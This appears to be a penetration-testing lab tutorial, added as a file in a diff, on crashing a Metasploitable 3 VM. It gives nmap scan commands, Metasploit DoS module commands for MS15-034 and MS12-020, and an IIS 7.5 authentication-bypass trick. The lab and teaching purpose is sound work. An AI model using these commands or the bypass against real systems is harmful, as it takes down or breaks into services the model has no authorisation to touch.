@@ -1,0 +1,29 @@
+
+Perform DOS Attack on Metasploitable 3
+
+Target: Metasploitable 3
+Attacker: Kali Linux
+ Scan the target IP to know the Open ports for running services. Use nmap command for scanning the victim PC. Type the following command on terminal in kali Linux to use aggressive scan.
+nmap -p-  -A 192.168.1.14
+
+From the result of scan we found that port 3389 is open for remote desktop service and under open port 80 http server header is configured with Microsoft IIS 7.5
+As we know port 3389 is badly affected with Dos attack moreover Microsoft IIS 7.5 has Classic ASP configured (it allows serving .asp files).There is a password protected directory configured that has administrative asp scripts inside.  An attacker requests the directory with: $i30:$INDEX_ALLOCATION appended to the directory name IIS/7.5 gracefully executes the ASP script without asking for proper credentials.
+https://www.rapid7.com/db/modules/auxiliary/dos/http/ms15_034_ulonglongad
+Use Nessus tool to scan the vulnerabilities of target Pc. Form vulnerabilities scanning result it shows two high vulnerabilities for exploit.
+
+Start metasploit framework by typing msfconsole on terminal in kali Linux when metasploit get loaded type following command for Dos attack.
+This module will check if scanned hosts are vulnerable to CVE-2015-1635 (MS15-034), vulnerability in the HTTP protocol stack (HTTP.sys) that could result in arbitrary code execution. This module will try to cause a denial-of-service.
+msf > use auxiliary/dos/http/ms15_034_ulonglongadd
+msf auxiliary(ms15_034_ulonglongadd) >set rhosts 192.168.1.14
+msf auxiliary(ms15_034_ulonglongadd) >exploit
+
+
+In same way we’ll create Dos attack through RDP connection for port 3389 using another module.
+This module exploits the MS12-020 RDP vulnerability originally discovered and reported by Luigi Auriemma. The flaw can be found in the way the T.125 Connect MCSPDU packet is handled in the maxChannelIDs field, which will result an invalid pointer being used, therefore causing a denial-of-service condition.
+msf > use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
+msf auxiliary(ms12_020_maxchannelids) >set rhost 192.168.1.14
+msf auxiliary(ms12_020_maxchannelids) >set rport 3389
+msf auxiliary(ms12_020_maxchannelids) >exploit
+
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
